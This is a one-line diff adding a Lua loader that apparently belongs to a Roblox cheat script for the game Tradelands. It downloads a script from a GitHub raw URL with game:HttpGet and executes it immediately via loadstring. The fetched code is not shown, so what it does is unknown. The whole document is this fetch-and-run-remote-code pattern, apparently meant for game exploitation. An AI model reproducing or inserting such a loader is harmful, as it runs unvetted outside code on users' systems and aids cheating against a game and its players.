@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zakater5/LuaRepo/main/Tradelands/mainV2.lua"))()
